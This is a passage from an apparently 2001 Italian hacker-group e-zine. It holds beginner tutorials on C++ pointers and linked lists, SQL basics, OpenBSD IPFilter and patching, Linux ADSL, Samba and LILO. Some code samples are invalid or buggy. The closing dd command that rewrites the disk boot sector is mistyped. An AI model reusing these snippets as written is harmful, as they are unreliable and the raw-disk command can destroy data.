  (dove tipo puo' essere char int float . . .)



  ---------------------------------------------------------------------------------------
    ____
   |___ \
     __) |
    / __/ _
   |_____(_)  OPERATORI FONDAMENTALI




  Gli operatori sono essenzialmente due : * , &
  & restituisce l'indirizzo di memoria del puntatore,

   pippo = &puntatore;

  Mette in pippo l'indirizzo di memoria del puntatore "puntatore"

   pippo2 = *pippo;

  Mette in pippo2 il valore che punta l'indirizzo di pippo , per esempio se "puntatore"
  aveva una locazione 100 allora "pippo" avra' il valore 100 e quindi dicendo a "pippo2"
  di prendere il valore dove punta "pippo" torneremo al valore iniziale.

  Riepilogando :

        & passa l'indirizzo
        * passa il valore a qui punta l'indirizzo

  Attenzione a nn commettere i seguenti errori :

  es1]

      int *p;
      float f;
      p=&f;    //  <- NN si puo' far puntare ad un INT la locazione di memorida di
               //     un float nn sono compatibili

  es2]

      int *p
      float f;
      p= (int *) &f;   // <- Il codice ora è corretto perche' abbiamo castato l'indirizzo
                       //    con (int *)



 ---------------------------------------------------------------------------------------
    _____
   |___ /
     |_ \
    ___) |
   |____(_)  ALTRI OPERATORI


  Supponiamo di avere

      int *p=2000;

      < 
      
      > 
      
      ==      // Questi operatori servono per i confronti tra puntatori



 ---------------------------------------------------------------------------------------

   | || |
   | || |_
   |__   _|
      |_|(_) PUNTATORI & ARRAY


  Puntatori e array in c++ sono strettamente correlati

     char pippo[10];
     char *p;
     p = pippo;

  Da questo codice notiamo che è possibile assegnare ad un puntatore un intero array,
  in realta' il puntatore p punta al primo elemento di pippo (pippo[0]) che gli
  permettera' di raggiungere tutti i successivi.

     pippo[5];

     *(p+5);

  Entrambe le soluzioni restituiscono il quinto elemento.
  Possiamo quindi riconoscere ora due metodi per accedere ai valori di un array, la prima
  consiste nei puntatori e la seconda con l'indicizzazione

  Vediamo ora come creare un array di puntatori :

    int *p[10];

  Abbiamo ora creato un array di puntatori interi, potremo quindi inserire solo indirizzi
  di variabili intere come questa

    int pippo;
    p[5] = &pippo;

  Un puntatore appena creato nn punta a nessuna area precisa, ed utilizzarlo e un rischio,
  potrebbe bloccare il sistema operativo stesso.

   int *p = (void*)0 // assegna NULL
 
    delete p // cancella un puntatore
    new      // capirete nel programma :)

  Infine abbiamo l'operatore freccia "->" per puntare ad un altro puntatore
  es p1->p2 ma nn spiego altro...guardate il programma :)


  ---------------------------------------------------------------------------------------
    ____
   | ___|
   |___ \
    ___) |
   |____(_) PROGRAMMA DI ESEMPIO

   Inserisco il mio programma di esempio che mostra una lista a puntatori,concatenata
   dove è possibile creare uno struct "NODO" che contiene un valore e un puntatore
   che serve a collegare la nostra lista :)
   Questo programma è stato scritto e compilato con il BORLAND C++ 5.0



   /*

  INIZIO

  BY QUASAR

  FOR NoflyZone

  LISTA_____________________________________________________________

                 succ
             P  ------> info
           __________________________________
          |      |      |      |      |      |
  Lista ->|info  | info | info | info | info |-> NULL
          |______|______|______|______|______|


  INSERIMENTO IN CODA_______________________________________________


                  succ
             P  ------> info
           __________________________________
          |      |      |      |      |      |
  Lista ->|info  | info | info | info | info | <--+
          |______|______|______|______|______|    |
                                                  |
                                                  |
                          _____                   |
                         |     |                  |
                  NULL<- |info | -----------------+
                         |_____|


  INSERIMENTO IN TESTA______________________________________________

                    succ
             P  ------> info
           __________________________________
          |      |      |      |      |      |
  Lista ->|info  | info | info | info | info |
      ^   |______|______|______|______|______|
      |
      |                   _____
      |                  |     |
      +----------------- |info |=lista->succ
                         |_____|

  CANCELLA______________________________________________

                    succ
             P  ------> info
           __________________________________
          |      |      |      |      |      |
  Lista ->|info  | info | CANC | info | info |
          |______|______|______|______|______|
                    \            /
                     \  ponte   /
                      \________/

  PRE & POST funzionano nello stesso modo, inseriscono tra 2 valori
  e creano un ponte tra i SUCC per collegare il tutto.

  __________________________________________________________________

  In pratica è possibile riempire la lista inserendo in coda cioe' un elemento
  dopo l'altro oppure in testa ovvero in cima la lista.
  Poi e possibile cancellare un dato valore ed è possibile inserire prima di
  un determinato valore o dopo di un determinato valore.
  Lo struct termina con NULL
  Il

  */

#include <iostream.h>
#include <conio.h>
#include <stdlib.h>
#include <stdio.h>

struct nodo  // crea un nodo contenente INFO come dato e succ come puntatore
{            // per collegare i nodi
 int info;
 nodo* succ;
};

nodo* lista=NULL;        // funzioni
nodo* testa(nodo* lista);
nodo* coda(nodo* lista);
nodo* pre(nodo* lista);
nodo* post(nodo* lista);
nodo* cancella(nodo* lista);
nodo* stampa(nodo* lista);
int Menu();

void main()   // penso che sia autoesplicativo ma se avete problemi chiamatemi
{
 int n=0;int i;
 nodo* l;
 char scelta;
 for(;;)
 {
  scelta=Menu();
  switch (scelta)
  {
   case '1' : {
               cout<<"\n Numero valori da inserire > ";
               cin>>n;
               cout<<"\n";
               for(i=0;i<n;i++)
               {
                l=testa(l);
               }
              };break;
   case '2' : {
               cout<<"\n Numero valori da inserire > ";
               cin>>n;
                cout<<"\n";
               for(i=0;i<n;i++)
               {
                l=coda(l);
               }
              };break;
   case '3' : l=pre(l);break;
   case '4' : l=post(l);break;
   case '5' : l=cancella(l);break;
   case '6' : l=stampa(l);break;
   case '7' : exit(0);break;
  }
 }
}

int Menu()        // semplice menu
{
 clrscr();
 char scelta;
 clrscr();
 cout<<"\n\n       QUASAR\n\n";
 cout<<"\n 1] Inserimento in Testa";
 cout<<"\n 2] Inserimento in Coda";
 cout<<"\n 3] Inserimento Prima di un valore";
 cout<<"\n 4] Inserimento Dopo di un valore";
 cout<<"\n 5] Cancella valore";
 cout<<"\n 6] Visualizza lista";
 cout<<"\n 7] Esci\n\n";
 cout<<" scelta > ";cin>>scelta;
 return scelta;
}

// visualizza ---------------------------------------------------------------

nodo* stampa(nodo* lista)
{
  // stampa tutto, inizializza il puntatore VIS con il valore lista
  // in modo di partire dall'inizio poi si aiuta a postarsi da uno
  // all'altro tramite SUCC

 clrscr();
 cout<<"\n ------- Visualizza ------- \n";
 if(lista==0) {cout<<"\n\n Lista vuota"; getch();}
  else
  {
   nodo* vis=lista;
   while(vis!=0)
   {
    cout<<"\n> "<<vis->info;  // si sposta
    vis=vis->succ;
   }
    getch();
  }
    return lista;
}

// testa --------------------------------------------------------------------

nodo* testa(nodo* lista)
{
  // inserisce in testa, crea un nuovo nodo con la funzione NEW
  // assegna a P il primo elemento puntato da lista cioe' la parte iniziale
  // in modo tale da trovarsi all'inizio e fa puntare a succ di P
  // il primo puntatore in modo da trovarsi alla testa dell'intera lista :)

 nodo* p=new nodo;
 cout<<" Inserire dato > ";
 cin>>p->info;     // insersce il dato INFO
 p->succ=lista;
 lista=p;
 return lista;
}

// coda ---------------------------------------------------------------------

nodo* coda(nodo* lista)
{
  // deve inserire alla fine quindi porta SUCC a NULL in quanto sara la coda
  // della lista poi ci spostiamo fino all'ultimo elemnento (aiuto=aiuto->succ)
  // infine quando ci siamo lo inseriamo  facendo puntare all'ultimo elemento
  // che c'era in precedenza quello che vuogliamo inserire noi(aiuto->succ=p)

 cout<<" Inserire dato > ";
 nodo* p=new nodo;
 cin>>p->info;
 p->succ=0;
 if (lista==0) lista=p;
  else
     {
      nodo* aiuto=lista;
      while(aiuto->succ!=0)
      {
       aiuto=aiuto->succ;  // si sposta
      }
      aiuto->succ=p;
     }
 return lista;
}

// cancella -----------------------------------------------------------------

nodo* cancella(nodo* lista)
{
 // cerca il puntatore e lo cancella, una volta cancellato rimane un buco
 // bisogna quindi inserire 2 puntatori che si inseguono in modo che uno
 // preceda l'altro e quando abbiamo trovato il valore lo cancelliamo
 // e grazie al puntatore precedente colleghiamo il buco con il nodo successivo
 // al valore cancellato

 int ric;
 nodo* q=lista;
 nodo* del=lista;
 if (lista==0) { cout<<"\n lista vuota"; getch(); }  // se la lista e vuota esce
   else
      {
       cout<<"\n Inserire numero da cancellare > ";
       cin>>ric;
       if(ric==q->info)
        {
         lista=q->succ;
         delete q;
         cout<<"\n Elemento eliminato";
        }
       else
       {
         while((del!=0)&&(del->info!=ric))
         {
          q=del;
          del=del->succ;    // si sposta
         }
          if(del==0)
           {
            cout<<"\n elemento non trovato";
           }
           else
            {
             q->succ=del->succ;         // collegamento del valore precedente
                                        // a quello di eliminare con il valore
                                        // successivo
             delete del;    // cancella un puntatore
             cout<<"\n ----> elemento eliminato ";
             }
        }
       }
  getch();
  return lista;
}

// post ---------------------------------------------------------------------

nodo* post(nodo* lista)
{
  // Inserisce dopo un dato valore, per fare questo ci si sposta con 2 puntatori
  // che si inseguono fino al valore desiderato poi si inserisce tra il valore
  // trovato e il valore successivo il proprio puntatore facendo un collegamento

 if (lista==0) {cout<<"\n Lista vuota ";getch();}
  else
     {
      int ric;
      cout<<"\n Numero da post > ";
      cin>>ric;
      nodo* aiuto=lista;
      nodo* post=lista;
      while((aiuto!=0)&&(aiuto->info!=ric))
      {
       aiuto=post;
       post=post->succ;
      }
      if(aiuto==0)
        {
         cout<<"\n elemento non trovato";
         getch();
        }
       else
        {
         nodo* p=new nodo;
         cout<<"\n Inserire dato > ";
         cin>>p->info;
         aiuto->succ=p;
         p->succ=post;
         cout<<"\n OK ";
        }
      }
   return lista;
}

// pre ----------------------------------------------------------------------

nodo* pre(nodo* lista)
{
  // Come per POST ma si inserisce tra il precedente e il valore scelto

  if (lista==0) {cout<<"\n Lista vuota ";getch();}
   else
      {
       int ric;
       cout<<"\n Numero da pre > ";
       cin>>ric;
       nodo* pre=lista;
       nodo* dato=lista;
       while((dato!=0)&&(dato->info!=ric))
       {
        pre=dato;
        dato=dato->succ;
       }
        if(dato==0)
        {
         cout<<"\n elemento non trovato";
         getch();
        }
        else if(dato==lista)
        {
          nodo* p=new nodo;
          cout<<"\n Inserire dato > ";
          cin>>p->info;
          p->succ=lista;
          lista=p;
        }
        else
         {
          nodo* p=new nodo;
          cout<<"\n Inserire dato > ";
          cin>>p->info;
          pre->succ=p;
          p->succ=dato;
         }
       }
   return lista;
}

  // FINE

  ---------------------------------------------------------------------------------------

                                  ...::::: Byez_ :::::...

  -----------------------------------------------------------------------------

------------------------------------*END*--------------------------------------

------------------------------------[25]---------------------------------------
------------------------------[[]Lord[V]icio[]]--------------------------------
---------------------------------[Basi SQL]------------------------------------

                                      []LoRd[V]icio[]
                                         Basi SQL    
                                /*     NoFlyZone-Crew      */


Structured Query Language

In quetsa lezione trattaremo il linguaggio di programmazione SQL
Questo linguaggio è orientato x il web,in una prima anticipazione si 
può definire come quel linguaggio ke recupera le informazione ke 
ci vengono mostrate da un database....
Ci soffermiamo un attimo a spiegare cosa vuol dire "database"
Database comunemente tradotto in italiano "base di dati" nn è altro
ke un insieme di dati ke viene organizzata e gestita da un sotfware 
specifico DBMS (DataBase Management System)...
Non mi soffermo molto sul DBMS x ora vi basta sapere ke è un software
ke si pone fra l'utente ed i dati...le sue principali funzioni sono :
quelle di consentire l'acccesso ai dati
permettere l'integrazioe e la condibisione dei dati con le applicazioni
controllare l'accesso ai dati e quindi assicurarne a loro integrità..


---------------

Come abbiamo accennato
L'utente interagisce con il database attraverso il linguaggio SQL, 
un linguaggio dichiarativo che permette di descrivere insiemi di dati. 
Le istruzioni SQL vengono scomposte dal DBMS in una serie 
di operazioni relazionali. 

L'invio delle istruzioni al DBMS puo' avvenire in due modi:

invocazione interattiva 
invocazione tramite un programma applicativo 

In invocazione interattiva viene utilizzato un programma il cui 
scopo e' quello di ricevere in input le istruzioni SQL, trasmetterle 
al DBMS e visualizzare i risultati all'utente.
DBMS mettono a disposizione un programma, di solito di tipo testuale, 
con tali funzionalita' 
Nel nostro caso il PostgreSQL ... 
un esempio di sintassi è :

psql dbname user  

in pratica 

psql viciodb vicio

"viciodb" è il mome del database e "ciccio" è il nome dell'user

se la stringa è esatta 

psql mostra un prompt simile al seguente:

mydb=>

A questo punto si può interragine con i comandi SQL (terminandoli 
con il comando \g x farli eseguire)..
Ma si può interragire anke in maniera diversa,ovvero invocando
invocando psql col seguente comando:

psql -f istruzioni.sql mydb vicio

In questo caso il programma esegue le istruzioni
presenti nel file .sql,così si posso ottimizzare le 
operazioni che devono essere ripetute spesso o ke 
sono composti da comandi SQ molto lunghi


-----------------------
|                     |
| Fine Prima Parte :P |
|                     |
-----------------------


X ora mi fermo qua ...
Il prossimo articolo tratterà la creazione di un database :P
Spero sia tutto kiaro ;) ..
ora vi saluto .. al prox appuntamento..
Se avete qualke dubbio nn esitate a contattarmi .........


 -------------------------------
 | www.noflyzone-crew.cjb.net|
 |---------------------------|



Saluti e dediche :**

Un salutone a tutta la NoFlyZone crew 
ad i chan #phrack.it #hack #webmaster #hackmaniaci 
#linux-club #opensource #unix #linuxiani e #rotfl

In particolare a :

#kiddies_crew , [V]lad , P®egzt , [Evil], Crashes , cityhunter , Quasar , cyberz , federico 
zukkerina83 , pex3 , looker , oversys , dominus , _1/2Matto , Bigalex 
MARSIO , e4m , hibrid2001 , diodeldragone , fossy  ecc ecc :P

Un particolare fuck a :

Tutti gli i lameracci ke scannano le p*ll*  
ma nn avete altro da fare ?

Dove trovarmi ?

irc.azzurra.org #NoFlyZone 
[]LoRd[V]icio[] o lordvicio

              
                _______________________________________
              [                                         ]
              [            Copyright (C) 2001           ]
              [                                         ]
              [ []LoRd[V]icio[]  -lordvicio@hotmail.com ]    
              [ _______________________________________ ]                   

------------------------------------*END*--------------------------------------

================================================================================
--------------------------------------------------------------------------------
-----------------------------------[Misc]---------------------------------------
--------------------------------------------------------------------------------
================================================================================


------------------------------------[26]---------------------------------------
----------------------------------[goony]--------------------------------------
---------------[Installare IPFilter nel kernel di OpenBSD 3.0]-----------------

Installare IPFilter nel kernel di OpenBSD 3.0


L'installazione di IPFilter dovrebbe essere semplice seguendo i passi qui sotto.
Nei casi dove "i386" è menzionato, se stai lavorando su una differente piattaforma,
sostituisci il suo nome e dovrebbe lavorare ugualmente bene.
Le patches includono IPFilter abilitandolo per il filtraggio su IPv4, IPv6
e filtraggio in bridge.

I comandi dati sotto sono intesi come suggerimenti piuttosto che esatte operazioni
di quello che necessita di essere scritto. In molti casi, i paths dei files o delle
directory potrebbero generare piccole somiglianze a quello che è presentato di seguito.

Potresti incontrare delle difficoltà con il punto 7 se hai fatto cambiamenti ai
files rc, i quali non permetterebbero l'applicazione corretta delle patches.

Se i passi seguenti sono eseguiti senza problemi puoi essere sicuro al punto 8
e fare il reboot con il nuovo kernel. Naturalmente se tu non stai usando il
GENERIC dovrai sostituire GENERIC con il nome del kernel. Se il file di configurazione
del tuo kernel include un "GENERIC" poi non dovrai aggiungere esplicitamente
opzioni per IPFilter.

1. Estrai il tuo albero dei sorgenti in /usr/src, creando /usr/src/sys.

cd /usr/src
gunzip -c sys.tar.gz | tar xpf -

2. Spostati nella directory /usr/src

3. Scompatta IPFilter e applica le patches ai sorgenti del kernel

cd ~
gunzip -c ip_fil3.4.23.tar.gz | tar xpf -
cd /usr/src
patch < ~/ip_fil3.4.23/OpenBSD/3.0-sys-diffs

4. Aggiungi IPFilter all'albero dei codici sorgenti:

cd ~/ip_fil3.4.23
BSD/kupgrade

5. Crea un nuovo kernel OpenBSD

/bin/rm -rf /sys/arch/i386/compile/GENERIC
cd /sys/arch/i386/conf
config GENERIC
cd ../compile/GENERIC
make depend && make
cp bsd /bsd

6. Crea e installa IPFilter

cd ip_fil3.4.23
make openbsd
make install-bsd
OpenBSD/makedevs-3.0


Creating IPFilter device files in /dev.
Platform i386 Major Number 77: ipl(0) ipnat(1) ipstate(2) ipauth(3)

7. Correggi gli scripts rc in /etc

cd /etc
patch < ~/ip_fil3.4.23/OpenBSD/3.0-rc-diffs

8. Riavvia


I files dei dispositivi di IPFilter

Le patches per includere i dispositivi di IPFilter possono essere trovate nel file
3.0-MAKEDEV-diffs. Queste differenze sono generalmente di interesse solo
se tu stai andando a sviluppare una distribuzione per altri e vuoi avere dei
corretti scripts MAKEDEV. Potresti anche voler usarli per correggere /dev/MAKEDEV
sulla tua macchina. Scripts MAKEDEV precostruiti (o patches individuali) per ogni architettura
non sono forniti. Dovrai aver estratto "./etc" da src.tar.gz per usare queste patches.



Traduzione di goony.

------------------------------------*END*--------------------------------------


------------------------------------[27]----------------------------------------
----------------------------------[[V]lad]--------------------------------------
------------------------------[ADSL on Linux]-----------------------------------

Bene bene bene..... e così vorresti sapere come configurare l'adsl su linux?????
Come come????
Hai l'Alcatel USB e non sai come configuraro???? No problem guy! Questo tutorial
è fatto apposta per TE!!!

Premessa:
Il metodo analizzato è stato testato solo con mandrake 8.0 e 8.1... se funzia
con altre distribuzioni fatemelo sapere!

Iniziamo:

Innanzitutto scaricate questo(non so se esiste per altre distribuzioni:():
                              ftp.rpmfind.net/linux/Mandrake/8.1/i586/Mandrake/RPMS/
                              speedtouch-0.01_20010815-5mdk.i586.rpm
ed installalo

e questo:
                              http://www.alcatel.com/consumer/dsl/dvrreg_lx.htm

e scompattalo da root in /root facendo "tar xvfz speedmgmt.tar.gz"

bene ora devi creare un piccolo script.....

<-----------CUT HERE--------------------------
#!/bin/sh
/sbin/modprobe n_hdlc
/sbin/modprobe ppp_synctty
/usr/bin/modem_run -f /root/mgmt/mgmt.o -m
/usr/sbin/pppd call adsl
/sbin/route add default ppp0
<-----------CUT HERE--------------------------

e chiamalo come vuoi.... io l'ho chiamato startadsl... la prossima cosa che devi
fare è renderlo eseguibile: chmod +700 /root/startadsl

Fatto questo vai in /etc/ppp/peers e crea un file, chiamalo adsl, e scrivici...
<-----------CUT HERE----------------------------
noipdefault
defaultroute
pty "/usr/bin/pppoa2 -vpi 8 -vci 35"
nodetach
sync
user "la tua userid di accesso"
password "la tua password"
noauth
noaccomp
nopcomp
noccp
<-----------CUT HERE----------------------------

Ora apri il file /etc/ppp/chap-secrets:
<------------CUT HERE-----------------------------
# Secrets for authentication using CHAP
# client server secret
tuauserid * tuapassword
<------------CUT HERE-----------------------------

e da shell: "ln -fs /etc/ppp/resolv.conf /etc/resolv.conf" per creare un link.

Inserisci poi in etc/ppp/resolv.conf gli indirizzi dei DNS del tuo provider

ed ora esegui lo script che avevamo creato all'inizio.....

Ecco che tutto funziona alla perfezione(o almeno dovrebbe :-)

Seeya a tutti

Ringrazio Claudio per le informazioni che mi hanno aiutato tantissimo a scrivere
questo tutorial

Altri ringraziamenti e saluti: Tutta la #noflyzone
                               Mamma

Fuck: SI! PROPRIO TU! STRONZA DI UNA PROF DI LATINO!!!!.....
      Telecom.... oggi ho saputo che a NY una cable la pagano meno della mia adsl.....
      :((


------------------------------------*END*--------------------------------------

------------------------------------[28]----------------------------------------
------------------------------[[]Lord[V]icio[]]---------------------------------
----------------------------[Win e Linux in rete]-------------------------------

                                []LoRd[V]icio[]
                             /*  NoFlyZone-crew */
                            Windows e Linux in rete



Questo tutorial nasce dall'esigenza di condivi-
dere due makkine collegate in rete locale...

----------------------------------------------
|L'articolo è orientato sulla condivisione   |
|delle directory di una Linux con Windows 98 |
 ---------------------------------------------

Il modo + semplice x condividere le directory
tra Linux e Windows rimane Samba,che crea delle
divisioni secondo il protocollo CIFS utilizzato
da Microsoft....


 ........          PRATICA         .........


Una volta installato il pakketto samb.rpm ,
dobbiamo fare in modo ke venga avviato in fase
di startup .. x far questo dobbiamo modificare
il file di configurazione rc.config
Per effettuare questa operazione consiglio di
usare Yast,selezionando la voce di menù
Sistem Administration ->
Change configuration file.
Quindi impostare la variabile
START_SMB a 'yes'
così al prossimo reebot partirà automatica-
mente Samba .. per evitare adesso possiamo
dare 'rcsmb start'.


   ........    CONFIGURARE SAMBA     .........

A questo punto occorre configurare Samba
modificando il file /etc/smb.conf.

Come fare ?

Possiamo farlo sostanzialmente in 2 modi

1 Utilizzare Swat (x i - esperti)
2 Editare il file /etc/smb.conf

Senza dubbio x i meno esperti utilizzare Swat
è la cosa + semplice......

Come prima cosa puntate il proprio browser
all'indirizzo http://localhost:901/
Dopo aver fatto questo dovete impostare il
nome del WORKGROUP nella sezione Globals e
creare la condivisione con i dati ke inten-
diamo utilizzare via rete nella sezione Shares
Nn dimenticate di riavviare Samba,utilizzando
gli appositi buttoni nella sezione Status.

Se invece vigliamo modificare il file
/etc/smb.conf con un editor,ecco un esempio
di un file smb.conf

#============================ Share Definitions ==============================

[homes]
   comment = Home Directories
   browseable = no
   writable = yes

# Un-comment the following and create the netlogon directory for Domain Logons
; [netlogon]
;   comment = Network Logon Service
;   path = /home/netlogon
;   guest ok = yes
;   writable = no
;   share modes = no


# Un-comment the following to provide a specific roving profile share
# the default is to use the user's home directory
;[Profiles]
;    path = /home/profiles
;    browseable = no
;    guest ok = yes


# NOTE: If you have a BSD-style print system there is no need to
# specifically define each individual printer
[printers]
   comment = All Printers
   path = /var/spool/samba
   browseable = no
# Set public = yes to allow user 'guest account' to print
   guest ok = no
   printable = yes

# This one is useful for people to share files
;[tmp]
;   comment = Temporary file space
;   path = /tmp
;   read only = no
;   public = yes

# A publicly accessible directory, but read only, except for people in
# the "staff" group
;[public]
;   comment = Public Stuff
;   path = /home/samba
;   public = yes
;   writable = yes
;   printable = no
;   write list = @staff

---------------- Stop ;) ----------------------

Pezzo preso da un conf di una red hat 7.2
di un amico :) ....

Al file ke avrete di default basterà
aggiungere una sezione relativa alla
condivisione ke si intende creare.

X esempio,x creare la condivisione 'DATI
DI SOLA LETTURA' con il contenuto della
directory /home/lordvicio/dati,
basterà aggiungere le seguenti righe

[DATI]
comment = Dati utente
lordvicio
path = /home/lordvicio/dati
guest ok = yes
writable = no

Anche in questo caso,prima di poter
accedere alla condivisione,occerrerà
riavviare Samba 'rcsmb restart'

Spero sia tutto kiaro ;) ..
ora vi saluto .. al prox appuntamento..
Se avete qualke dubbio nn esitate a contattarmi .........

Saluti e dediche :**

Un salutone a tutta la NoFlyZone crew
ad i chan #phrack.it #hack #webmaster #hackmaniaci
#linux-club #opensource #unix #linuxiani e #rotfl

In particolare a :

P®egzt , [Evil], Crashes , cityhunter , quasar , cyberz , federico
zukkerina83 , pex3 , looker , oversys , dominus , _1/2Matto , Bigalex
MARSIO , e4m , hibrid2001 , diodeldragone , fossy  ecc ecc :P

Un particolare fuck a :

lonewolfden , reikon , tinospider , il chan #lordspirit
e tutti gli altri lameracci ke scannano le p*ll*
ma nn avete altro da fare ?

Dove trovarmi ?

irc.azzurra.org #NoFlyZone
[]LoRd[V]icio[] o lordvicio


                _______________________________________
              [                                         ]
              [            Copyright (C) 2001           ]
              [                                         ]
              [ []LoRd[V]icio[]  -lordvicio@hotmail.com ]
              [ _______________________________________ ]




------------------------------------*END*---------------------------------------

------------------------------------[29]----------------------------------------
-----------------------[Applicare patches ad OpenBSD]---------------------------
----------------------------------[goony]---------------------------------------

applicare patches ad OpenBSD

. note
. introduzione
. i sorgenti
. i files delle correzioni (patches)
. esempio: correggiamo sshd
. applicare la correzione


note:

il documento è rivolto ad utenti alla prime armi;

per qualsiasi chiarimento date un occhio alla faq 10.14 ufficiale: http://www.openbsd.
org/faq/faq10.html#10.14;

l'autore non si assume nessuna responsabilità nell'utilizzo errato del documento;

per migliorie, consigli, minaccie :) ecc. goony@inwind.it;


introduzione

I sorgenti di OpenBSD sono in continuo cambiamento, miglioramento e sotto osservazione. 
Capita così di dover andare ad applicare delle apposite correzioni (patches) ai nostri 
sorgenti. Queste correzioni vengono riportate periodicamente sul sito ufficiale all'indirizzo 
http://www.openbsd.org/errata.html. In questa pagina sono suddivise per architetture 
(i386/alpha/sparc...). Ad esempio un bug potrebbe essere presente solo nel software di una 
specifica piattaforma, o nel caso peggiore potrebbe riguardarle tutte. Notare che queste 
correzioni pubblicate riguardano solo problemi (in particolar modo relativi alla sicurezza), 
della release del momento e di quelle precedenti, quindi non interessano possibili nuovi 
progetti o funzioni future.


i sorgenti

Per prima cosa dobbiamo fornirci dei sorgenti che permettono di applicare le correzioni. 
Possiamo trovarli direttamente sul primo CD della release in questione, o prelevarli via 
ftp. I file in questione sono:

1.src.tar.gz
2.srcsys.tar.gz

Il primo file contiene i sorgenti dei programmi che costituiscono OpenBSD mentre il secondo 
fornisce tutti i files necessari per compilare il kernel. Sposta questi due file in /usr/src, 
dove andremo a scompattarli. 

# cp src.tar.gz /usr/src
# cp srcsys.tar.gz /usr/src
# cd /usr/src
# tar zxvf src.tar.gz
# rm src.tar.gz
# tar zxvf srcsys.tar.gz
# rm srcsys.tar.gz
 # copiamo il file src.tar.gz nella directory /usr/src
# copiamo il file srcsys.tar.gz nella directory /usr/src
# entriamo nella directory /usr/src
# scompattiamo il file src.tar.gz
# cancelliamo il file src.tar.gz (ho poco spazio sull'hd! ;)
# scompattiamo il file srcsys.tar.gz
# cancelliamo il file srcsys.tar.gz (ho poco spazio sull'hd! ;)
 



i files delle correzioni (patches)

A differenza di altri sistemi operativi, i files delle correzioni per OpenBSD sono distribuiti 
come "diffs" (man diff!), cioè semplici files di testo che esprimo le differenze al codice 
sorgente originale. Non sono distribuiti in forma binaria. Questo significa che per correggere 
il nostro sistema avremo bisogno del codice sorgente della release che stiamo utilizzando. 
Notare che non dobbiamo avere per forza tutti i sorgenti di OpenBSD (anche se prima abbiamo 
scaricato i due files src.tar.gz e srcsys.tar.gz che possono tornare utili), ma sono 
sufficienti e indispensabili tutti i sorgenti del programma che stiamo correggendo. 
Ovviamente se stai applicando patches al kernel avrai bisogno di tutto il suo codice sorgente. 

Useremo il tool cvs per prelevare da un anonymous cvs server solo i sorgenti del programma che 
stiamo correggendo. Una lista dei server cvs la puoi trovare alla pagina ftp://ftp.openbsd.org
/pub/OpenBSD/patches/. Potete così prelevare una patch alla volta, oppure direttamente 
l'archivio .tar.gz che le contiene tutte.


esempio: correggiamo sshd

In questa piccola guida tratteremo solo un esempio da usare come modello per le altre correzioni.
In questo caso specifico, lavoreremo la release 3.0 con kernel GENERIC, su piattaforma i386 
(OpenBSD ratm 3.0 GENERIC#94 i386), ma il metodo rimane lo stesso anche per le altre release. 
Per prima cosa diamo un occhio alla pagina ufficiale delle patches: http://www.openbsd.org/
errata.html. Selezioniamo la nostra release e controlliamo a che architettura si riferisce. 
Ad esempio troviamo "002: SECURITY FIX: November 12, 2001", cioè la patch numero 2 pubblicata 
il 12 novembre 2001, riguardante il demone sshd e relativa a tutte le architetture hardware. 
(quindi anche la nostra i386!) A questo punto leggiamo le due righe di spiegazione per sapere 
di cosa tratta in particolare e scarichiamoci il file per la correzione. (salvate il file ad 
esempio in /usr/src). Nel file (in questo caso si chiama 002_ssh.patch) troviamo una voce 
"Index:" che indica il path del sorgente che dobbiamo avere o che dobbiamo prelevare ad 
esempio con il cvs.
Per l'utilizzo del cvs avete già capito cosa dovete fare! ;) 

# cd /usr
# cvs -danoncvs@anoncvs5.usa.openbsd.org:/cvs co -rOPENBSD_3_0_BASE usr.bin/ssh/Makefile.inc 


applicare la correzione

Diamo ancora un occhio al file di correzione 002_ssh.patch, che indica anche le operazioni da 
effettuare. In questo caso:

# cd /usr/src
# patch -p0 < 002_ssh.patch
   alla fine del processo se tutto è andato bene dovremmo trovarci:
   Patching file usr.bin/ssh/version.h using Plan A...
   Hunk #1 succeeded at 1.
   done
# cd usr.bin/ssh
# make obj
# make cleandir
# make depend
# make && make install

Se non visualizziamo messaggi errori... abbiamo corretto il demone sshd! :)
A questo punto riavviamo il servizio (se attivo) e stiamo in allerta per le prossime future 
patches!
Se poi volete stare aggiornati in modo professionale ai bug relativi ad OpenBSD vi consiglio 
di seguire la mailing list bugs@OpenBSD.org.



goony@inwind.it


------------------------------------*END*---------------------------------------


------------------------------------[30]----------------------------------------
---------------------------------[Crashes]--------------------------------------
---------------------------------[L.I.L.O]--------------------------------------


Salve :) ragazzi, come state....uhm è un pò ke nn ci sentiamo avete raggione ma
eccomi qui di nuovo, con una guida semplice sul famoso LILO di Linux. Sono state
molte le richieste da parte Vs su questo Loader, ke vi ha dato molti problemi e
sinceramente la prima volta li ha dati anke a me.. :))) eheheh....

OK, iniziamo, LILO nn è altro ke un Loader utilizzato da Linux per avviare l'OS,
può essere utilizzato anke per ki ha + OS sul proprio PC o su un unico HDD, kiaro
è ke la documentazione sul LILO in rete se ne trova in quantità industriale e anke
sui vari CD di Linux ed è in alcuni casi anke ben fatta e molto esauriente, quindi
nn meilatemi per cazzate :)) ok...
Dopo aver installato Linux, alla prox accensione del PC si avvierà il LILO ke nn
fa altro ke andare a caricare il kernel di Linux ke risiede in una parte del Vs HDD,
kiaro, ke il kernel di Linux deve essere in una parte visibile da BIOS ma questo mi
sembra anke logico.Troverete installato Linux nella parte /tc/lilo.conf questa è la
parte essenziale del Loader perchè qui trovere informazioni su quello ke LILO fa al
momento del lancio, potete anke trovarlo, nella MBR del HDD ovvero /dev/hda o anche
nella root di Linux.(/dev/hda1-/dev/hda2)
-----------------------------------------------------------------------------------
Quando avrete la skermata di LILO all'avvio del PC è possibile iteragire con lui
piggiando il tasto TAB, potrete così avere una lista delle possibilità di avvio ke
LILO può darvi, qui potrete scegliere quello ke a voi rimane + comodo, certo se
alcuni di nn succede questo vuol dire ke nn è stato configurato per avere questo
comando così possiamo ovviare premendo ALT+SHIFT prima ke appare la scritta LILO sul
monitor.
-----------------------------------------------------------------------------------
OK, veniamo alla parte + interessante di tutto il discorso, molti interventi nel
canale #Noflyzone di "Azzurra" irc.azzurra.net, sono stati su come disinstallare il
LILO, non so per quale motivo :)) ma questi sono affari Vs, il fatto è ke molti si
sono come dire impiccati, e hanno riskiato in molti casi, di sputtanarsi il pc, dunque
 a mio parere, il sistema è molto semplice i passaggi nn sono molti basta solo
 prestare attenzione..................dunque LILO sovrascrive il primo settore di
 boot /dev/hda, una copia di questo settore viene salvata nella /boot/"nome anonimo.
 ####
quindi nn dovrete fare altro ke rimettere il settore di boot al posto di dove era
prima....... :)) come? cakio come come? uhm...se è in /dev/hda ---> [dd if =/boot/
nomeanonimo.#### of=/dev/had bs=446 count 1] ok....penso di si...:)) Voi smanettatori
